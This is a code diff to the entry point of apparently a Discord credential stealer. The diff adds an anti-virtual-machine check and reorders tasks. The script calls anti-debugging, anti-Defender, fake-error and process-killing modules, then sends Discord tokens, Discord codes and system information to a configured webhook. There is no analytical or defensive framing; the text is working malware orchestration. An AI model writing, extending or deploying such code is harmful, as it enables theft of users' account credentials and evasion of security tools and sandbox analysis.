@@ -1,5 +1,6 @@
 const antiDebug        = require('./modules/antidebug/index.js');
 const antiDefender     = require('./modules/antidefender/index.js');
+const antiVM           = require('./modules/antivm/index.js');
 const discordCodes     = require('./modules/discodes/index.js');
 const fakeError        = require('./modules/fakeerror/index.js');
 const discordInjection = require('./modules/injections/discord/index.js');
@@ -11,9 +12,11 @@ const CONFIG = require('./config/config.js');
 
 async function aurita() {
     try {
+        await antiVM();
+        
         const tasks = [
-            antiDebug(),
             fakeError(),
+            antiDebug(),
             antiDefender(),
             killProcess(),
         ];
@@ -27,16 +30,17 @@ async function aurita() {
         ];
 
         const tasks3 = [
+            discordCodes(CONFIG.webhook),
             discordTokens(CONFIG.webhook),
             system(CONFIG.webhook),
-            discordCodes(CONFIG.webhook),
         ];
         
         await Promise.all([
-            Promise.all(tasks),
-            Promise.all(tasks2),
-            Promise.all(tasks3),
+           ...tasks,
+           ...tasks2,
+           ...tasks3,
         ]);
+
     } catch (error) {
         console.error('Error occurred:', error);
     }
